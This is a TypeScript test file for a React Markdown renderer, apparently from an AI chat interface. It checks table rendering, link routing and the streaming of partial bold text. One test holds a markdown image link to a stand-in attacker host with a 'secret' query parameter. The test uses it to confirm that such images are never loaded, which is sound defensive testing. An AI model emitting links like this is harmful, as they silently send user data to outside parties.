import { render, screen } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

import { Markdown, type MarkdownLinkProps } from "../markdown";

describe("Markdown", () => {
  it("renders a table and routes links through renderLink", async () => {
    const renderLink = vi.fn(({ href, children }: MarkdownLinkProps) => (
      <a data-testid="routed" href={href}>
        {children}
      </a>
    ));

    render(
      <Markdown renderLink={renderLink}>
        {[
          "| Order | Total |",
          "| --- | --- |",
          "| #1005 | 120 |",
          "",
          "See [order #1005](/app/orders/o-1).",
        ].join("\n")}
      </Markdown>,
    );

    expect(await screen.findByRole("table")).toBeTruthy();
    const link = await screen.findByTestId("routed");
    expect(link.getAttribute("href")).toBe("/app/orders/o-1");
    expect(renderLink).toHaveBeenCalled();
  });

  it("never paints unterminated emphasis as raw asterisks while streaming", async () => {
    const { container } = render(
      <Markdown streaming>{"Sales are **up"}</Markdown>,
    );

    expect(await screen.findByText(/Sales are/)).toBeTruthy();
    expect(container.textContent).not.toContain("**");
  });

  it("never loads an image the text points at", async () => {
    const { container } = render(
      <Markdown>
        {"Done. ![x](https://attacker.example/?q=secret) Anything else?"}
      </Markdown>,
    );

    expect(await screen.findByText(/Anything else/)).toBeTruthy();
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("attacker.example");
  });
});
